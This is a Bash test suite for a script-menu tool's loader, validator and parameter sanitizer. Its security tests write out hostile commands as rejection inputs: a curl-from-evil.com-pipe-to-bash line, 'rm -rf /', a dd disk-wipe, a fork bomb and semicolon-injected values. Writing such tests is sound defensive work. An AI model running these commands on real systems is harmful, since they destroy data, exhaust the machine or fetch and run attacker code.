#!/bin/bash

# =============================================================================
# Test Suite for External Scripts System
# =============================================================================
# Description: Tests for script loader, validator, and executor
# Version:     1.0
# =============================================================================

# =============================================================================
# Test Configuration
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Colors for test output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# =============================================================================
# Test Utilities
# =============================================================================

print_test_header() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}$1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo ""
}

assert_equals() {
    local expected="$1"
    local actual="$2"
    local test_name="$3"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    
    if [[ "$expected" == "$actual" ]]; then
        echo -e "${GREEN}✓${NC} $test_name"
        TESTS_PASSED=$((TESTS_PASSED + 1))
        return 0
    else
        echo -e "${RED}✗${NC} $test_name"
        echo -e "  Expected: $expected"
        echo -e "  Actual:   $actual"
        TESTS_FAILED=$((TESTS_FAILED + 1))
        return 1
    fi
}

assert_true() {
    local condition="$1"
    local test_name="$2"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    
    if eval "$condition"; then
        echo -e "${GREEN}✓${NC} $test_name"
        TESTS_PASSED=$((TESTS_PASSED + 1))
        return 0
    else
        echo -e "${RED}✗${NC} $test_name"
        echo -e "  Condition failed: $condition"
        TESTS_FAILED=$((TESTS_FAILED + 1))
        return 1
    fi
}

assert_false() {
    local condition="$1"
    local test_name="$2"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    
    if ! eval "$condition"; then
        echo -e "${GREEN}✓${NC} $test_name"
        TESTS_PASSED=$((TESTS_PASSED + 1))
        return 0
    else
        echo -e "${RED}✗${NC} $test_name"
        echo -e "  Condition should have failed: $condition"
        TESTS_FAILED=$((TESTS_FAILED + 1))
        return 1
    fi
}

# =============================================================================
# Setup and Teardown
# =============================================================================

setup_test_environment() {
    # Create temporary directory for tests
    TEST_DIR=$(mktemp -d)
    TEST_SCRIPTS_DIR="$TEST_DIR/scripts"
    TEST_CONFIG_DIR="$TEST_DIR/config"
    
    mkdir -p "$TEST_SCRIPTS_DIR"
    mkdir -p "$TEST_CONFIG_DIR"
    
    # Source modules
    source "$PROJECT_ROOT/src/utils.sh" 2>/dev/null || true
    source "$PROJECT_ROOT/src/logger.sh" 2>/dev/null || true
    source "$PROJECT_ROOT/src/script_loader.sh" 2>/dev/null || true
    source "$PROJECT_ROOT/src/script_validator.sh" 2>/dev/null || true
    source "$PROJECT_ROOT/src/script_executor.sh" 2>/dev/null || true
    
    # Set test configuration
    ALLOWED_SCRIPT_DIRS="$TEST_SCRIPTS_DIR"
    LOG_FILE="$TEST_DIR/test.log"
}

teardown_test_environment() {
    # Clean up temporary directory
    if [[ -d "$TEST_DIR" ]]; then
        rm -rf "$TEST_DIR"
    fi
}

# =============================================================================
# Script Loader Tests
# =============================================================================

test_script_loader() {
    print_test_header "Script Loader Tests"
    
    # Test 1: Load valid scripts.conf with existing scripts
    cat > "$TEST_SCRIPTS_DIR/script1.sh" << 'EOF'
#!/bin/bash
echo "Script 1"
EOF
    chmod +x "$TEST_SCRIPTS_DIR/script1.sh"
    
    cat > "$TEST_SCRIPTS_DIR/script2.sh" << 'EOF'
#!/bin/bash
echo "Script 2"
EOF
    chmod +x "$TEST_SCRIPTS_DIR/script2.sh"
    
    cat > "$TEST_CONFIG_DIR/scripts.conf" << EOF
# Test configuration
Test Script 1|$TEST_SCRIPTS_DIR/script1.sh|Test script 1|1|
Test Script 2|$TEST_SCRIPTS_DIR/script2.sh|Test script 2|2|param1
EOF
    
    load_script_config "$TEST_CONFIG_DIR/scripts.conf" >/dev/null 2>&1
    assert_equals "2" "${#SCRIPT_ENTRIES[@]}" "Load 2 valid script entries"
    
    # Test 2: Ignore comments and empty lines
    cat > "$TEST_SCRIPTS_DIR/script.sh" << 'EOF'
#!/bin/bash
echo "Test"
EOF
    chmod +x "$TEST_SCRIPTS_DIR/script.sh"
    
    cat > "$TEST_CONFIG_DIR/scripts.conf" << EOF
# Comment line

Test Script|$TEST_SCRIPTS_DIR/script.sh|Test|1|

# Another comment
EOF
    
    # Clear array manually
    SCRIPT_ENTRIES=()
    load_script_config "$TEST_CONFIG_DIR/scripts.conf" >/dev/null 2>&1
    assert_equals "1" "${#SCRIPT_ENTRIES[@]}" "Ignore comments and empty lines"
    
    # Test 3: Handle malformed entries
    cat > "$TEST_CONFIG_DIR/scripts.conf" << 'EOF'
Invalid Entry Without Pipe
|Missing Name|Description|1|
Name Only|
EOF
    
    # Clear array manually
    SCRIPT_ENTRIES=()
    load_script_config "$TEST_CONFIG_DIR/scripts.conf" >/dev/null 2>&1
    assert_equals "0" "${#SCRIPT_ENTRIES[@]}" "Reject malformed entries"
    
    # Test 4: Get script info
    cat > "$TEST_SCRIPTS_DIR/myscript.sh" << 'EOF'
#!/bin/bash
echo "My script"
EOF
    chmod +x "$TEST_SCRIPTS_DIR/myscript.sh"
    
    cat > "$TEST_CONFIG_DIR/scripts.conf" << EOF
My Script|$TEST_SCRIPTS_DIR/myscript.sh|My test script|1|param
EOF
    
    # Clear array manually
    SCRIPT_ENTRIES=()
    load_script_config "$TEST_CONFIG_DIR/scripts.conf" >/dev/null 2>&1
    local info=$(get_script_info "My Script")
    assert_true "[[ -n \"\$info\" ]]" "Get script info for loaded script"
}

# =============================================================================
# Script Validator Tests
# =============================================================================

test_script_validator() {
    print_test_header "Script Validator Tests"
    
    # Test 1: Validate existing executable script
    cat > "$TEST_SCRIPTS_DIR/valid_script.sh" << 'EOF'
#!/bin/bash
echo "Valid script"
EOF
    chmod +x "$TEST_SCRIPTS_DIR/valid_script.sh"
    
    validate_script_execution "$TEST_SCRIPTS_DIR/valid_script.sh" >/dev/null 2>&1
    assert_equals "0" "$?" "Validate existing executable script"
    
    # Test 2: Reject non-existent script
    validate_script_execution "$TEST_SCRIPTS_DIR/nonexistent.sh" >/dev/null 2>&1
    assert_equals "10" "$?" "Reject non-existent script"
    
    # Test 3: Reject non-executable script
    cat > "$TEST_SCRIPTS_DIR/no_exec.sh" << 'EOF'
#!/bin/bash
echo "No execute permission"
EOF
    chmod -x "$TEST_SCRIPTS_DIR/no_exec.sh"
    
    validate_script_execution "$TEST_SCRIPTS_DIR/no_exec.sh" >/dev/null 2>&1
    assert_equals "13" "$?" "Reject non-executable script"
    
    # Test 4: Sanitize dangerous parameters
    local sanitized=$(sanitize_parameters "test; rm -rf /")
    assert_false "[[ \"\$sanitized\" == *';'* ]]" "Remove semicolon from parameters"
    # Note: sanitize_parameters removes dangerous characters, not words
    # validate_parameters is responsible for detecting dangerous patterns
    assert_true "[[ -n \"\$sanitized\" ]]" "Sanitized result is not empty"
    
    # Test 5: Validate safe parameters
    validate_parameters "safe param1 param2" >/dev/null 2>&1
    assert_equals "0" "$?" "Accept safe parameters"
    
    # Test 6: Reject dangerous parameters
    validate_parameters "rm -rf /" >/dev/null 2>&1
    assert_equals "1" "$?" "Reject dangerous parameters"
}

# =============================================================================
# Path Validation Tests
# =============================================================================

test_path_validation() {
    print_test_header "Path Validation Tests"
    
    # Test 1: Script in allowed directory
    cat > "$TEST_SCRIPTS_DIR/allowed.sh" << 'EOF'
#!/bin/bash
echo "Allowed"
EOF
    chmod +x "$TEST_SCRIPTS_DIR/allowed.sh"
    
    check_script_in_allowed_directory "$TEST_SCRIPTS_DIR/allowed.sh" "$ALLOWED_SCRIPT_DIRS" >/dev/null 2>&1
    assert_equals "0" "$?" "Accept script in allowed directory"
    
    # Test 2: Script outside allowed directory
    local outside_dir=$(mktemp -d)
    cat > "$outside_dir/outside.sh" << 'EOF'
#!/bin/bash
echo "Outside"
EOF
    chmod +x "$outside_dir/outside.sh"
    
    check_script_in_allowed_directory "$outside_dir/outside.sh" "$ALLOWED_SCRIPT_DIRS" >/dev/null 2>&1
    assert_equals "1" "$?" "Reject script outside allowed directory"
    
    rm -rf "$outside_dir"
}

# =============================================================================
# Parameter Sanitization Tests
# =============================================================================

test_parameter_sanitization() {
    print_test_header "Parameter Sanitization Tests"
    
    # Test 1: Remove dangerous characters
    local result=$(sanitize_parameters "test;command")
    assert_false "[[ '$result' == *';'* ]]" "Remove semicolon"
    
    result=$(sanitize_parameters "test&background")
    assert_false "[[ '$result' == *'&'* ]]" "Remove ampersand"
    
    result=$(sanitize_parameters "test|pipe")
    assert_false "[[ '$result' == *'|'* ]]" "Remove pipe"
    
    result=$(sanitize_parameters 'test$var')
    assert_false "[[ \"\$result\" == *'\$'* ]]" "Remove dollar sign"
    
    result=$(sanitize_parameters 'test`command`')
    assert_false "[[ \"\$result\" == *'\`'* ]]" "Remove backticks"
    
    # Test 2: Remove quotes
    result=$(sanitize_parameters 'test"quoted"')
    assert_false "[[ \"\$result\" == *'\"'* ]]" "Remove double quotes"
    
    result=$(sanitize_parameters "test'quoted'")
    assert_false "[[ \"\$result\" == *\"'\"* ]]" "Remove single quotes"
    
    # Test 3: Limit length
    local long_string=$(printf 'a%.0s' {1..1000})
    result=$(sanitize_parameters "$long_string" 100)
    assert_true "[[ ${#result} -le 100 ]]" "Limit parameter length"
    
    # Test 4: Preserve safe characters
    result=$(sanitize_parameters "test-param_123")
    assert_equals "test-param_123" "$result" "Preserve safe characters"
}

# =============================================================================
# Security Tests
# =============================================================================

test_security() {
    print_test_header "Security Tests"
    
    # Test 1: Detect command injection attempts
    validate_parameters "test; rm -rf /" >/dev/null 2>&1
    assert_equals "1" "$?" "Detect command injection with semicolon"
    
    validate_parameters "test && malicious" >/dev/null 2>&1
    assert_equals "1" "$?" "Detect command chaining"
    
    validate_parameters "curl http://evil.com | bash" >/dev/null 2>&1
    assert_equals "1" "$?" "Detect pipe to bash"
    
    # Test 2: Detect dangerous commands
    validate_parameters "rm -rf /important" >/dev/null 2>&1
    assert_equals "1" "$?" "Detect rm -rf"
    
    validate_parameters "dd if=/dev/zero of=/dev/sda" >/dev/null 2>&1
    assert_equals "1" "$?" "Detect dd command"
    
    # Test 3: Detect fork bomb
    validate_parameters ":(){ :|:& };:" >/dev/null 2>&1
    assert_equals "1" "$?" "Detect fork bomb"
}

# =============================================================================
# Integration Tests
# =============================================================================

test_integration() {
    print_test_header "Integration Tests"
    
    # Test 1: End-to-end script loading and validation
    cat > "$TEST_CONFIG_DIR/scripts.conf" << EOF
Test Script|$TEST_SCRIPTS_DIR/test.sh|Test script|1|
EOF
    
    cat > "$TEST_SCRIPTS_DIR/test.sh" << 'EOF'
#!/bin/bash
echo "Integration test"
exit 0
EOF
    chmod +x "$TEST_SCRIPTS_DIR/test.sh"
    
    # Clear array manually
    SCRIPT_ENTRIES=()
    load_script_config "$TEST_CONFIG_DIR/scripts.conf" >/dev/null 2>&1
    assert_equals "1" "${#SCRIPT_ENTRIES[@]}" "Load script from config"
    
    validate_script_execution "$TEST_SCRIPTS_DIR/test.sh" >/dev/null 2>&1
    assert_equals "0" "$?" "Validate loaded script"
    
    # Test 2: Execute script and check exit code
    "$TEST_SCRIPTS_DIR/test.sh" >/dev/null 2>&1
    assert_equals "0" "$?" "Execute script successfully"
}

# =============================================================================
# Main Test Runner
# =============================================================================

run_all_tests() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}Bashmenu External Scripts System - Test Suite${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    
    # Setup
    setup_test_environment
    
    # Run test suites
    test_script_loader
    test_script_validator
    test_path_validation
    test_parameter_sanitization
    test_security
    test_integration
    
    # Teardown
    teardown_test_environment
    
    # Print summary
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}Test Summary${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "Total tests:  $TESTS_RUN"
    echo -e "${GREEN}Passed:       $TESTS_PASSED${NC}"
    echo -e "${RED}Failed:       $TESTS_FAILED${NC}"
    echo ""
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}✓ All tests passed!${NC}"
        echo ""
        return 0
    else
        echo -e "${RED}✗ Some tests failed${NC}"
        echo ""
        return 1
    fi
}

# =============================================================================
# Entry Point
# =============================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    run_all_tests
    exit $?
fi
